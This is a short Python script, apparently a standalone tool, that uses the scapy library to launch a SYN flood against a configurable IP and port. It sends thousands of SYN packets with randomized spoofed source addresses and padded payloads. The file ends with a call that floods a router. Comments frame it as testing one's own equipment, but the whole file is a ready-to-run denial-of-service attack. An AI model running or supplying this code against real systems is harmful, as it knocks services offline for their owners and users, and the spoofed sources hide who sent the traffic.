# whereas this one works for a specified amount of packets
from scapy.all import IP, TCP, Raw, RandShort, send
from random import randint

# Target configuration (for testing in YOUR environment)
target_ip = ""  # Replace with your router's IP
target_port = 80             # Replace with an open port on your router

# Function to send a high volume of SYN packets
def syn_flood(target_ip, target_port, packet_count=10000):
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
    for i in range(packet_count):
        # Randomize source IP and port to simulate distributed traffic
        src_ip = f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        raw = Raw(b"X" * 1024)  # 1KB payload to increase load
        packet = ip / tcp / raw
        send(packet, verbose=0)  # Send the packet without verbose output
    print("Attack completed.")

# Example: Flood the router
syn_flood(target_ip, target_port, packet_count=5000)